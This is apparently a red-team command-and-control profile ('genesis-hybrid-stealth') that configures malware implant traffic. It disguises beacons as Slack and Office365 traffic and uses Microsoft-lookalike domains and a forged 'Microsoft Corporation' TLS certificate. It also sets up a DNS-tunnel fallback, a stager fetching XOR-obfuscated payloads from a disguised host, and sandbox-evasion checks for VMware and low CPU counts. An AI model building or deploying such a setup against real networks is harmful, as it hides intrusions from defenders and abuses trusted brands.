# redteam_toolkit/c2_profiles/custom_profiles/hybrid.profile

profile_name = "genesis-hybrid-stealth"

transport_https {
  uri = ["/cdn-edge/fetch", "/api/v1/status", "/msauth/validate", "/slk/v2/channels"]
  host_header = "cdn.edge.microsoft-corp.io"
  useragent = "Slack/4.35.126 (Windows; Electron) Chrome/122.0.0.0"
  headers = {
    "X-App-Version" = "4.35.126",
    "X-Origin-Cluster" = "azure-north-01",
    "Accept-Encoding" = "gzip, deflate",
    "X-Slack-Session" = "%sessionid%"
  }
  jitter = 15-40
  sleep = 120s
  kill_date = "2026-03-01"
  cert_chain = "/opt/certs/hybrid-chain.pem"
  tls_fingerprint = "chrome120"
  redirect_on_block = true
  redirect_uri = "https://outlook.office365.com/"
}

fallback_dns {
  domain = "dns.genesis-sink.net"
  max_txt_size = 230
  jitter = 30-90
  idle_ip = "1.1.1.1"
  subdomain_template = "%uid%.%sessionid%.%rand%.%c2domain%"
  max_retries = 8
  encrypted_payload = true
  padding = true
}

stager {
  uri_x86 = "/dl/update32.bin"
  uri_x64 = "/dl/update64.bin"
  staging_host = "files.cdn.microsoft-edge.net"
  compression = "gzip"
  obfuscation = "xor"
  fingerprint = "Microsoft-Downloader/10.0"
}

advanced_settings {
  implant_name = "sysdiagsvc"
  smart_jitter = true
  beacon_rotation = true
  dead_switches = ["geo:block=RU,CN,IR", "env:detect=VMware", "cpu:core<2"]
  dns_fallback_on_fail = true
  auto_mtu_adjust = true
  header_noise_level = "moderate"
  signal_harden = true
  protocol_mimicry = "office365"
  max_channels = 5
}

tls_certificate {
  CN = "cdn.edge.microsoft-corp.io"
  O  = "Microsoft Corporation"
  OU = "CloudEdge CDN"
  validity = "720"
  country = "US"
  state = "Washington"
  city = "Redmond"
}

monitoring_flags {
  jitter_entropy_check = true
  beacon_gap_analysis = true
  tls_jarm_check = false
  outbound_volume_threshold = "50kb/min"
}
